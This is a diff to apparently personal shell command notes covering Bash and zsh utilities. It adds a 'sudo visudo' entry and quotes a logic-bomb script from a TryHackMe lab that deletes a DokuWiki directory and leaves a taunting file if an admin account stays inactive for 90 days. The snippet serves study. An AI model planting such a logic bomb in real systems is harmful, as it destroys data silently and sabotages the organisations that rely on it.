@@ -6,6 +6,9 @@ sl
 # Thanks for this Cam =]
 ```
 
+`sudo visudo`
+	Modify the sudoer's file
+
 Covered/covering so far:
 - Powershell
 - Bash
@@ -307,3 +310,13 @@ zsh (z Shell) (/bin/zsh (providing it's there) will change $SHELL on the fly, zs
 			- Chop long-lines (rather than wrapping them across the terminal window)
 
 - `zip -r -Z bzip2 zipped-file-name.zip folder-to-zip`
+
+- A disgruntled employee had left this, lol (THM/disgruntled) - example of a logic bomb:
+	```
+	OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
+	if [ -z "$OUTPUT" ]; then
+		rm -r /var/lib/dokuwiki
+		echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!! HAHAHAHA\n-" > /goodbye.txt
+	fi
+	```
+	
